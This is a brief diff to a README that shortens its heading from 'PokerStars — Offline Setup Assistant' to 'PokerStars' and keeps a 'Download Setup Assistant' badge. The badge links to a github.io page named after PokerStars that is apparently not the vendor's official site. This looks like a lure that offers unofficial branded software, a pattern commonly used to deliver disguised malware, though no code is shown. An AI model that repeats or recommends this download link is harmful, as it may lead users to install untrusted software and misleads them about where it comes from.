@@ -1,4 +1,4 @@
-# PokerStars — Offline Setup Assistant
+# PokerStars 
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://pokerstars-download.github.io/.github)
 
